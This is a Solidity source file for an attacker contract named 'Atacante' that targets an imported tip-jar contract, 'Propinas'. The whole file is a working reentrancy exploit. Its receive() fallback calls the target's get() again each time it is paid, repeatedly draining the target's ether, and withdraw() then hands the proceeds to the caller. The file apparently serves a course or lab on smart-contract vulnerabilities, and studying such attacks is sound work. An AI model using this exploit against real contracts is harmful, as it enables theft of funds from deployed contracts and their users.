pragma solidity 0.6.4;

import "./Propinas.sol";

contract Atacante {
  Propinas public propinas;

  event Collected(address indexed _from, uint _value);
  event Transfer(address indexed _from, uint _value);

  constructor(address payable _propinas) public payable {
    propinas = Propinas(_propinas);
  }

  function collectTips() external {
    propinas.get();
  }

  function withdraw() public payable {
    emit Transfer(msg.sender, address(this).balance);
    msg.sender.transfer(address(this).balance);
  }

  receive () external payable {
    uint AmountOfEther = address(propinas).balance;

    uint myBalanceInTarget = propinas.getBalanceOf(address(this));
    if (AmountOfEther >= myBalanceInTarget) {
      propinas.get();
    }
    emit Collected(msg.sender, address(this).balance);
  }
}